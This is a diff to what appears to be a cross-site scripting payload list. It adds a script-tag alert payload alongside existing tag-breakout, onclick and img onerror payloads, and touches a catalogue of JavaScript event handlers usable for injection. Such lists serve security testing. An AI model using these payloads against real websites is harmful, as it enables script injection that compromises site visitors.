@@ -1,3 +1,4 @@
+<script> javascript:alert('1') </script>
 "><script> javascript:alert('1') </script>
 <a onclick="alert(omurugur);">/
 "><img src=x onerror=prompt(/omur/)> 
@@ -1403,6 +1404,7 @@ The Dottoro Web Reference also has a nice list of events in JavaScript.
 103.	onUnload() (as the user clicks any link or presses the back button or attacker forces a click) 
 104.	onURLFlip() (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file) 
 105.	seekSegmentTime() (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.) 
+
 
 
 
